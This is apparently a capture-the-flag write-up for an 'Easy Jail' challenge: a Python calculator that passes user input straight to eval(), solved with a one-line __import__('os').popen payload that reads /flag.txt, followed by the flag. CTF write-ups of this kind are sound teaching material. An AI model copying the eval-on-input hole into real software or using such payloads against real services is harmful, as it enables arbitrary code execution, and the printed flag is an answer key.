# Easy Jail

**Final Points:** 100


## Description
I made this calculator. I have a feeling that it's not safe :(

## Attachments 

+ [challenge.zip](./challenge.zip)


---
## Writeup

On connecting to the connection and reading the code attached with the problem which is as below
``` python3
#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		calc(inp)

if __name__ == '__main__':
	main()
```
I found that it is really an easy *PyJail* Challenge. Trying the below command gave the flag

`>>> __import__('os').popen('cat /flag.txt').read()`
> __import__('os').popen('cat /flag.txt').read() --> KashiCTF{3V4L_41NT_54F3_0q6PBe9E}

---
## Flag

```
KashiCTF{3V4L_41NT_54F3_0q6PBe9E}
```  